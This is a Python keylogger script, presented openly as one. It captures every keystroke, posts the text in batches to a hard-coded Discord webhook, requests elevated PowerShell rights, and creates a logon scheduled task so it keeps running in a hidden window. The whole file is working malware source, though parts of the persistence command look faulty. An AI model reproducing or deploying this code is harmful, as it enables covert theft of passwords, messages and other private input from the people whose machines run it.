import subprocess
import keyboard
import requests
import os

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328725000420593694/A9IUtra7YC0anOEi8Zt0RGcWgcuE6UXlGBEht3hitU_0BK0WNB-Jq34QZveTd9UaOy0R"  # Replace with your actual webhook URL

# Function to execute PowerShell commands
def run_powershell_command(command):
    subprocess.Popen(["powershell.exe", "-Command", command], shell=True)

# Function to send captured keystrokes to Discord webhook
def send_to_discord_webhook(keystrokes):
    payload = {
        "content": keystrokes
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload)

# Function to start capturing keystrokes
def start_keylogger():
    keystrokes = ""
    special_keys = {
        "space": " ",
        "enter": "\n",
        "backspace": "[BACKSPACE]",
        "tab": "[TAB]",
        "caps lock": "[CAPS LOCK]",
    }

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name

            if key in special_keys:
                # Append the special key value
                keystrokes += special_keys[key]
            else:
                # Handle normal keys
                if len(key) == 1:  # Check for single-character keys
                    keystrokes += key
                else:
                    keystrokes += f"[{key.upper()}]"  # Other keys (like 'shift', 'ctrl')

            # Send keystrokes to Discord webhook every 50 characters
            if len(keystrokes) >= 50:
                send_to_discord_webhook(keystrokes)
                keystrokes = ""

# Function to create a scheduled task for persistence
def create_scheduled_task():
    username = os.getlogin()
    script_path = os.path.abspath(__file__)
    task_name = "Keylogger"
    command = f"powershell.exe -Command 'Start-Process python -ArgumentList \"{script_path}\" -WindowStyle Hidden'"

    # Create the scheduled task
    run_powershell_command(f"New-ScheduledTask -Action (New-ScheduledTaskAction -Execute {command}) -Trigger (New-ScheduledTaskTrigger -AtLogon) -TaskName '{task_name}' -User '{username}'")

# Main function
if __name__ == "__main__":
    # Open PowerShell
    run_powershell_command("Start-Process powershell.exe -Verb runAs")

    # Close PowerShell
    run_powershell_command("Stop-Process -Name powershell")

    # Create scheduled task for persistence
    create_scheduled_task()

    # Start capturing keystrokes
    start_keylogger()
